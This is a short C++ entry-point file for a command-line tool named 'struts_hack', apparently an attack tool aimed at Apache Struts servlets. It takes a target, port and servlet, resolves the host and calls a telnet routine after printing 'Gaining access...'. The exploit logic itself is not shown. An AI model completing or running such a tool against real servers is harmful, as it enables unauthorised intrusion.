#include "hdr.h"

int main(int argc, char* argv[]) {
    if (argc != 4) {
        cout << "Usage:" << endl << "struts_hack [target] [port] [servlet]" << endl;
        return 1;
    }

    addrinfo* addr = findHost(argv[1], argv[2]);

    if (addr == NULL) {
        return 1;
    }

    cout << "Gaining access..." << endl;
    telnet(addr, argv[1], argv[3]);

    return 1;
}
